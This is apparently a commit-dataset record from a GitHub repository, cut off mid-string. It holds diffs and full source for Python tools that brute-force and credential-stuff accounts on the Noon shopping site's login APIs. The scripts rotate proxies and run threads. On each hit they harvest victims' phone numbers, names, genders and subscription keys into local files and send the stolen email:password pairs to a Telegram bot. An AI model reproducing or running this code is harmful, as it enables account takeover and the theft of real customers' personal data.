ModuleNotFoundError:","\t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629')","\t\tprint('You must download the library')","\t\tprint('pip install requests')","\t\texit()","\ttry:","\t\timport threading","\texcept ModuleNotFoundError:","\t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629')","\t\tprint('You must download the library')","\t\tprint('pip install threading')","\t\texit()","\ttry:","\t\timport pyfiglet","\texcept ModuleNotFoundError:","\t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629')","\t\tprint('You must download the library')","\t\tprint('pip install pyfiglet')","\t\texit()","\tprint(f\"\"\"[$] Brute Force ","\t{pyfiglet.figlet_format('NooN')}---------------------------\"\"\")","\tprint(\"By  @TweakPY - @vv1ck\")","\tprint(\"---------------------------\")","\temail=input(\"[?] Type Email or username:\\n\")","\tThread=int(input(\"[\/] Thread: \"))","\tprint(\"---------------------------\")","\tTRT()","library()"],"goodparts":["except ModuleNotFoundError:exit('[!] Download The Missing Module !')","def header():","    print(\"\"\"","\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557    \u2588\u2588\u2588\u2557   \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557   \u2588\u2588\u2557","\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d    \u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551","\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551","\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551","\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551         \u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551","\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d         \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d","                By @TweakPY - @vv1ck                                         ","\"\"\")","def saver(user,pess,rq):","    ID=''#telegram id","    token=''#telegram bot token","    try:post(f'https:\/\/api.telegram.org\/bot{token}\/sendMessage?chat_id={ID}&text=\u2022 New user Hacked {user}:{pess} \ud83e\udda6\\n\\nBy\\t@TweakPY\\t-\\t@vv1ck')","    except:pass","    try:","        r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode']","        with open('Hacked.txt', 'a') as x:","            acc=f'USR []\\nPhone Num:[{phone}]\\nLast Name:[{lN}]\\nlanguage:[{lc}]\\nJoin Date:[{jD}]\\nGender:[{gr}]\\nFirst Name:[{fnm}]\\nEmail:[{user}]\\nPassword:[{pess}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n'","            x.write(acc)","    except Exception as i:","        with open('Hacked.txt', 'a') as x:","            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\n')","def Brute_Force_Noon(user,pess):","    try:","        rq=post('https:\/\/login.noon.com\/_svc\/customer-v1\/auth\/signin',headers={'Host': 'login.noon.com','User-Agent': 'Mozilla\/5.0 (X11; Linux x86_64; rv:91.0) Gecko\/20100101 Firefox\/91.0','Accept': 'application\/json, text\/plain, *\/*','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','Referer': 'https:\/\/login.noon.com\/uae-en\/','Content-Type': 'application\/json','Cache-Control': 'no-cache','X-Locale': 'en-ae','X-Platform': 'web','Content-Length': '56','Origin': 'https:\/\/login.noon.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Te': 'trailers'},json={\"email\":user,\"password\":pess})","        if rq.status_code==200:os.system('cls' if os.name == 'nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500$ {Fore.GREEN}Hacked{Fore.RESET} >> {user}:{pess}\");saver(user,pess,rq)","        else:os.system('cls' if os.name == 'nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500$ {Fore.LIGHTRED_EX}Not Hacked{Fore.RESET} >> {user}:{pess}\")","    except KeyboardInterrupt:exit()","def O_File():","    FL=input('[+] Combo File Name : ')","    count=0","    try:","        for x in open(FL,'r').read().splitlines():","            count+=1","            user=x.split(\":\")[0]","            pess=x.split(\":\")[1];sleep(5);Brute_Force_Noon(user,pess)","    except IndexError:exit()","    except FileNotFoundError:print('[!] The File Not Found !');return O_File()","os.system('cls' if os.name == 'nt' else 'clear');header();O_File()"]}],"source":"\n\ntry: \tproxy=open('proxy.txt', 'r').read().splitlines() except FileNotFoundError: \tprint('\u0645\u0644\u0641 \u0627\u0644\u0628\u0631\u0648\u0643\u0633\u064a \u063a\u064a\u0631 \u0645\u0648\u062c\u0648\u062f') \tprint('Proxy file not found') \tinput() \texit() def noon(): \tglobal threading,requests,random,Thread,email \ttry: \t\tpess=open('password.txt').read().splitlines() \texcept FileNotFoundError: \t\tprint('\u0645\u0644\u0641 \u0627\u0644\u0628\u0627\u0633\u0648\u0631\u062f \u063a\u064a\u0631 \u0645\u0648\u062c\u0648\u062f') \t\tprint('password file not found') \t\ttry: \t\t\tinput() \t\t\texit() \t\texcept KeyboardInterrupt: \t\t\texit() \tproxylist=[] \twhile True: \t\tfor pxr in proxy: \t\t\tproxylist.append(pxr) \t\t\tpxx=str(random.choice(proxylist)) \t\tfor pess in pess: \t\t\thead={ 'Host': 'api-app.noon.com', 'Cookie': 'missing', 'Content-Type': 'application\/json', 'X-Experience': 'ecom', 'X-Locale': 'ar-sa', 'Accept': 'application\/json, text\/plain, *\/*', 'X-Mp': 'noon', 'Accept-Language': 'en-us', 'Cache-Control': 'no-cache', 'X-Content': 'mobile', 'Content-Length': '52', 'User-Agent': 'noon\/1000 CFNetwork\/1237 Darwin\/20.4.0', 'X-Device-Id': '9149EBD3-33DE-4568-918B-0469ECAA6453', 'X-Platform': 'ios', 'X-Build': '1000', 'Connection': 'close'} \t\t\tdata={\"email\": email,\"password\": pess}\t\t \t\t\ttry: \t\t\t\tproxx={ \t\t\t\t\t'http': f'http:\/\/{pxx}', \t\t\t\t\t'https': f'http:\/\/{pxx}'} \t\t\t\treq1=requests.post(\"https:\/\/api-app.noon.com\/_svc\/customer-v1\/auth\/signin\",headers=head,json=data,proxies=proxx,timeout=4) \t\t\t\tif req1.status_code==200: \t\t\t\t\tprint(f'\\n[+] Done[{email}:{pess}]') \t\t\t\t\tprint(f'[+] Check acc_Done.txt For more INFO about this account') \t\t\t\t\tphone=req1.json()['data']['phone'] \t\t\t\t\tlN=req1.json()['data']['lastName'] \t\t\t\t\tlc=req1.json()['data']['languageCode'] \t\t\t\t\tjD=req1.json()['data']['joinDate'] \t\t\t\t\tia=req1.json()['data']['id'] \t\t\t\t\tgr=req1.json()['data']['gender'] \t\t\t\t\tfnm=req1.json()['data']['firstName'] \t\t\t\t\tcoc=req1.json()['data']['countryCode'] \t\t\t\t\tsKey=req1.json()['data']['subscriptionKey'] \t\t\t\t\twith open('acc_Done.txt', 'a') as x: \t\t\t\t\t\tacc=f'Phone Num:[{phone}]\\nLast Name:[{lN}]\\nlanguage:[{lc}]\\nJoin Date:[{jD}]\\nID:[{ia}]\\nGender:[{gr}]\\nFirst Name:[{fnm}]\\nEmail:[{email}]\\nPassword:[{pess}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]' \t\t\t\t\t\tx.write(acc) \t\t\t\t\t\texit() \t\t\t\telse: \t\t\t\t\tprint(f'[-] NOT HACKED{email}:{pess}') \t\t\texcept requests.exceptions.ConnectionError: \t\t\t\tprint(f'[%] Bad Proxy <{str(pxx)}>') \t\t\t\tpass \t\t\texcept KeyboardInterrupt: \t\t\t\texit() def TRT(): \tglobal threading,requests,random,Thread,email \tthread=[] \tfor i in range(Thread): \t\tthread1=threading.Thread(target=noon) \t\tthread1.start() \t\tthread.append(thread1) \t\tfor thread2 in thread: \t\t\tthread2.join() def library(): \tglobal threading,requests,random,Thread,email \ttry: \t\timport requests,random \texcept ModuleNotFoundError: \t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629') \t\tprint('You must download the library') \t\tprint('pip install requests') \t\texit() \ttry: \t\timport threading \texcept ModuleNotFoundError: \t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629') \t\tprint('You must download the library') \t\tprint('pip install threading') \t\texit() \ttry: \t\timport pyfiglet \texcept ModuleNotFoundError: \t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629') \t\tprint('You must download the library') \t\tprint('pip install pyfiglet') \t\texit() \tprint(f\"\"\"[$] Brute Force \t{pyfiglet.figlet_format('NooN')}---------------------------\"\"\") \tprint(\"By @TweakPY -@vv1ck\") \tprint(\"---------------------------\") \temail=input(\"[?] Type Email or username:\\n\") \tThread=int(input(\"[\/] Thread: \")) \tprint(\"---------------------------\") \tTRT() library() ","sourceWithComments":"#head~data by @D0omy\ntry:\n\tproxy=open('proxy.txt', 'r').read().splitlines()\nexcept FileNotFoundError:\n\tprint('\u0645\u0644\u0641 \u0627\u0644\u0628\u0631\u0648\u0643\u0633\u064a \u063a\u064a\u0631 \u0645\u0648\u062c\u0648\u062f')\n\tprint('Proxy file not found')\n\tinput()\n\texit()\ndef noon():\n\tglobal threading,requests,random,Thread,email\n\ttry:\n\t\tpess=open('password.txt').read().splitlines()\n\texcept FileNotFoundError:\n\t\tprint('\u0645\u0644\u0641 \u0627\u0644\u0628\u0627\u0633\u0648\u0631\u062f \u063a\u064a\u0631 \u0645\u0648\u062c\u0648\u062f')\n\t\tprint('password file not found')\n\t\ttry:\n\t\t\tinput()\n\t\t\texit()\n\t\texcept KeyboardInterrupt:\n\t\t\texit()\n\tproxylist=[]\n\twhile True:\n\t\tfor pxr in proxy:\n\t\t\tproxylist.append(pxr)\n\t\t\tpxx=str(random.choice(proxylist))\n\t\tfor pess in pess:\n\t\t\thead={\n                'Host': 'api-app.noon.com',\n                'Cookie': 'missing',\n                'Content-Type': 'application\/json',\n                'X-Experience': 'ecom',\n                'X-Locale': 'ar-sa',\n                'Accept': 'application\/json, text\/plain, *\/*',\n                'X-Mp': 'noon',\n                'Accept-Language': 'en-us',\n                'Cache-Control': 'no-cache',\n                'X-Content': 'mobile',\n                'Content-Length': '52',\n                'User-Agent': 'noon\/1000 CFNetwork\/1237 Darwin\/20.4.0',\n                'X-Device-Id': '9149EBD3-33DE-4568-918B-0469ECAA6453',\n                'X-Platform': 'ios',\n                'X-Build': '1000',\n                'Connection': 'close'}\n\t\t\tdata={\"email\": email,\"password\": pess}\t\t\n\t\t\ttry:\n\t\t\t\tproxx = {\n\t\t\t\t\t'http': f'http:\/\/{pxx}',\n\t\t\t\t\t'https': f'http:\/\/{pxx}'}\n\t\t\t\treq1=requests.post(\"https:\/\/api-app.noon.com\/_svc\/customer-v1\/auth\/signin\",headers=head,json=data,proxies=proxx,timeout=4)\n\t\t\t\tif req1.status_code==200:\n\t\t\t\t\tprint(f'\\n[+] Done [{email}:{pess}]')\n\t\t\t\t\tprint(f'[+] Check acc_Done.txt For more INFO about this account')\n\t\t\t\t\tphone=req1.json()['data']['phone']\n\t\t\t\t\tlN=req1.json()['data']['lastName']\n\t\t\t\t\tlc=req1.json()['data']['languageCode']\n\t\t\t\t\tjD=req1.json()['data']['joinDate']\n\t\t\t\t\tia=req1.json()['data']['id']\n\t\t\t\t\tgr=req1.json()['data']['gender']\n\t\t\t\t\tfnm=req1.json()['data']['firstName']\n\t\t\t\t\tcoc=req1.json()['data']['countryCode']\n\t\t\t\t\tsKey=req1.json()['data']['subscriptionKey']\n\t\t\t\t\twith open('acc_Done.txt', 'a') as x:\n\t\t\t\t\t\tacc=f'Phone Num:[{phone}]\\nLast Name:[{lN}]\\nlanguage:[{lc}]\\nJoin Date:[{jD}]\\nID:[{ia}]\\nGender:[{gr}]\\nFirst Name:[{fnm}]\\nEmail:[{email}]\\nPassword:[{pess}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]'\n\t\t\t\t\t\tx.write(acc)\n\t\t\t\t\t\texit()\n\t\t\t\telse:\n\t\t\t\t\tprint(f'[-] NOT HACKED {email}:{pess}')\n\t\t\texcept requests.exceptions.ConnectionError:\n\t\t\t\tprint(f'[%] Bad Proxy <{str(pxx)}>')\n\t\t\t\tpass\n\t\t\texcept KeyboardInterrupt:\n\t\t\t\texit()\ndef TRT():\n\tglobal threading,requests,random,Thread,email\n\tthread=[]\n\tfor i in range(Thread):\n\t\tthread1 = threading.Thread(target=noon)\n\t\tthread1.start()\n\t\tthread.append(thread1)\n\t\tfor thread2 in thread:\n\t\t\tthread2.join()\ndef library():\n\tglobal threading,requests,random,Thread,email\n\ttry:\n\t\timport requests,random\n\texcept ModuleNotFoundError:\n\t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629')\n\t\tprint('You must download the library')\n\t\tprint('pip install requests')\n\t\texit()\n\ttry:\n\t\timport threading\n\texcept ModuleNotFoundError:\n\t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629')\n\t\tprint('You must download the library')\n\t\tprint('pip install threading')\n\t\texit()\n\ttry:\n\t\timport pyfiglet\n\texcept ModuleNotFoundError:\n\t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629')\n\t\tprint('You must download the library')\n\t\tprint('pip install pyfiglet')\n\t\texit()\n\tprint(f\"\"\"[$] Brute Force \n\t{pyfiglet.figlet_format('NooN')}---------------------------\"\"\")\n\tprint(\"By  @TweakPY - @vv1ck\")\n\tprint(\"---------------------------\")\n\temail=input(\"[?] Type Email or username:\\n\")\n\tThread=int(input(\"[\/] Thread: \"))\n\tprint(\"---------------------------\")\n\tTRT()\nlibrary()\n"}},"msg":"Update Brute-Force-Noon.py"},"9037c67779eae001e0c3473f4d844e259f4c6a39":{"url":"https:\/\/api.github.com\/repos\/Filza2\/Brute-Force-Noon\/commits\/9037c67779eae001e0c3473f4d844e259f4c6a39","html_url":"https:\/\/github.com\/Filza2\/Brute-Force-Noon\/commit\/9037c67779eae001e0c3473f4d844e259f4c6a39","sha":"9037c67779eae001e0c3473f4d844e259f4c6a39","keyword":"brute force update","diff":"diff --git a\/Brute-Force-Noon.py b\/Brute-Force-Noon.py\nindex 960bd49..6292007 100644\n--- a\/Brute-Force-Noon.py\n+++ b\/Brute-Force-Noon.py\n@@ -13,15 +13,14 @@ def header():\n                 By @TweakPY - @vv1ck                                         \n \"\"\")\n def saver(user,pess,rq):\n-    ID=''#telegram id\n-    token=''#telegram bot token\n+    ID=''#Telegram id\n+    token=''#Telegram bot token\n     try:post(f'https:\/\/api.telegram.org\/bot{token}\/sendMessage?chat_id={ID}&text=\u2022 New user Hacked {user}:{pess} \ud83e\udda6\\n\\nBy\\t@TweakPY\\t-\\t@vv1ck')\n     except:pass\n     try:\n         r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode']\n         with open('Hacked.txt', 'a') as x:\n-            acc=f'USR []\\nPhone Num:[{phone}]\\nLast Name:[{lN}]\\nlanguage:[{lc}]\\nJoin Date:[{jD}]\\nGender:[{gr}]\\nFirst Name:[{fnm}]\\nEmail:[{user}]\\nPassword:[{pess}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n'\n-            x.write(acc)\n+            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\nName:[{fnm} {lN}]\\nPhone Number:[{phone}]\\nJoin Date:[{jD}]\\nender:[{gr}]\\nLanguage:[{lc}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n')\n     except Exception as i:\n         with open('Hacked.txt', 'a') as x:\n             x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\n')\n@@ -33,10 +32,8 @@ def Brute_Force_Noon(user,pess):\n     except KeyboardInterrupt:exit()\n def O_File():\n     FL=input('[+] Combo File Name : ')\n-    count=0\n     try:\n         for x in open(FL,'r').read().splitlines():\n-            count+=1\n             user=x.split(\":\")[0]\n             pess=x.split(\":\")[1];sleep(5);Brute_Force_Noon(user,pess)\n     except IndexError:exit()\n","message":"","files":{"\/Brute-Force-Noon.py":{"changes":[{"diff":"\n                 By @TweakPY - @vv1ck                                         \n \"\"\")\n def saver(user,pess,rq):\n-    ID=''#telegram id\n-    token=''#telegram bot token\n+    ID=''#Telegram id\n+    token=''#Telegram bot token\n     try:post(f'https:\/\/api.telegram.org\/bot{token}\/sendMessage?chat_id={ID}&text=\u2022 New user Hacked {user}:{pess} \ud83e\udda6\\n\\nBy\\t@TweakPY\\t-\\t@vv1ck')\n     except:pass\n     try:\n         r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode']\n         with open('Hacked.txt', 'a') as x:\n-            acc=f'USR []\\nPhone Num:[{phone}]\\nLast Name:[{lN}]\\nlanguage:[{lc}]\\nJoin Date:[{jD}]\\nGender:[{gr}]\\nFirst Name:[{fnm}]\\nEmail:[{user}]\\nPassword:[{pess}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n'\n-            x.write(acc)\n+            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\nName:[{fnm} {lN}]\\nPhone Number:[{phone}]\\nJoin Date:[{jD}]\\nender:[{gr}]\\nLanguage:[{lc}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n')\n     except Exception as i:\n         with open('Hacked.txt', 'a') as x:\n             x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\n')\n","add":3,"remove":4,"filename":"\/Brute-Force-Noon.py","badparts":["    ID=''#telegram id","    token=''#telegram bot token","            acc=f'USR []\\nPhone Num:[{phone}]\\nLast Name:[{lN}]\\nlanguage:[{lc}]\\nJoin Date:[{jD}]\\nGender:[{gr}]\\nFirst Name:[{fnm}]\\nEmail:[{user}]\\nPassword:[{pess}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n'","            x.write(acc)"],"goodparts":["    ID=''#Telegram id","    token=''#Telegram bot token","            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\nName:[{fnm} {lN}]\\nPhone Number:[{phone}]\\nJoin Date:[{jD}]\\nender:[{gr}]\\nLanguage:[{lc}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n')"]},{"diff":"\n     except KeyboardInterrupt:exit()\n def O_File():\n     FL=input('[+] Combo File Name : ')\n-    count=0\n     try:\n         for x in open(FL,'r').read().splitlines():\n-            count+=1\n             user=x.split(\":\")[0]\n             pess=x.split(\":\")[1];sleep(5);Brute_Force_Noon(user,pess)\n     except IndexError:exit()\n","add":0,"remove":2,"filename":"\/Brute-Force-Noon.py","badparts":["    count=0","            count+=1"],"goodparts":[]}],"source":"\ntry:import os;from requests import post;from time import sleep;from colorama import Fore except ModuleNotFoundError:exit('[!] Download The Missing Module !') def header(): print(\"\"\" \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d \u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551 \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d By @TweakPY -@vv1ck \"\"\") def saver(user,pess,rq): ID='' token='' try:post(f'https:\/\/api.telegram.org\/bot{token}\/sendMessage?chat_id={ID}&text=\u2022 New user Hacked{user}:{pess} \ud83e\udda6\\n\\nBy\\t@TweakPY\\t-\\t@vv1ck') except:pass try: r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode'] with open('Hacked.txt', 'a') as x: acc=f'USR[]\\nPhone Num:[{phone}]\\nLast Name:[{lN}]\\nlanguage:[{lc}]\\nJoin Date:[{jD}]\\nGender:[{gr}]\\nFirst Name:[{fnm}]\\nEmail:[{user}]\\nPassword:[{pess}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n' x.write(acc) except Exception as i: with open('Hacked.txt', 'a') as x: x.write(f'USR[]\\nEmail:[{user}]\\nPassword:[{pess}]\\n') def Brute_Force_Noon(user,pess): try: rq=post('https:\/\/login.noon.com\/_svc\/customer-v1\/auth\/signin',headers={'Host': 'login.noon.com','User-Agent': 'Mozilla\/5.0(X11; Linux x86_64; rv:91.0) Gecko\/20100101 Firefox\/91.0','Accept': 'application\/json, text\/plain, *\/*','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','Referer': 'https:\/\/login.noon.com\/uae-en\/','Content-Type': 'application\/json','Cache-Control': 'no-cache','X-Locale': 'en-ae','X-Platform': 'web','Content-Length': '56','Origin': 'https:\/\/login.noon.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Te': 'trailers'},json={\"email\":user,\"password\":pess}) if rq.status_code==200:os.system('cls' if os.name=='nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500${Fore.GREEN}Hacked{Fore.RESET} >>{user}:{pess}\");saver(user,pess,rq) else:os.system('cls' if os.name=='nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500${Fore.LIGHTRED_EX}Not Hacked{Fore.RESET} >>{user}:{pess}\") except KeyboardInterrupt:exit() def O_File(): FL=input('[+] Combo File Name: ') count=0 try: for x in open(FL,'r').read().splitlines(): count+=1 user=x.split(\":\")[0] pess=x.split(\":\")[1];sleep(5);Brute_Force_Noon(user,pess) except IndexError:exit() except FileNotFoundError:print('[!] The File Not Found !');return O_File() os.system('cls' if os.name=='nt' else 'clear');header();O_File() ","sourceWithComments":"try:import os;from requests import post;from time import sleep;from colorama import Fore\nexcept ModuleNotFoundError:exit('[!] Download The Missing Module !')\ndef header():\n    print(\"\"\"\n    \n\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557    \u2588\u2588\u2588\u2557   \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557   \u2588\u2588\u2557\n\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d    \u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\n\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\n\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\n\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551         \u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d         \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d\n\n                By @TweakPY - @vv1ck                                         \n\"\"\")\ndef saver(user,pess,rq):\n    ID=''#telegram id\n    token=''#telegram bot token\n    try:post(f'https:\/\/api.telegram.org\/bot{token}\/sendMessage?chat_id={ID}&text=\u2022 New user Hacked {user}:{pess} \ud83e\udda6\\n\\nBy\\t@TweakPY\\t-\\t@vv1ck')\n    except:pass\n    try:\n        r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode']\n        with open('Hacked.txt', 'a') as x:\n            acc=f'USR []\\nPhone Num:[{phone}]\\nLast 